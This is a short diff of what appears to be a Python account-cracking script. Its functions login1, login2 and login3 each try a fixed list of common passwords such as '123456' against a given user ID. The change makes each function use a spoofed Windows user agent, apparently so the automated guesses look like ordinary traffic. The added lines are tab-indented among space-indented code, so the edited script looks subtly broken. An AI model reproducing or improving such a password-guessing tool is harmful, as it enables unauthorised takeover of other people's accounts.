@@ -484,6 +484,7 @@ def login1(uid):
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
+	ua = windows()    
         for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
             data = {
                 'adid': str(uuid.uuid4()),
@@ -573,6 +574,7 @@ def login2(uid):
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
+	ua = windows()  
         for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
             data = {
                 'adid': str(uuid.uuid4()),
@@ -662,6 +664,7 @@ def login3(uid):
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
+	ua = windows()
         for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
             data = {
                 'adid': str(uuid.uuid4()),
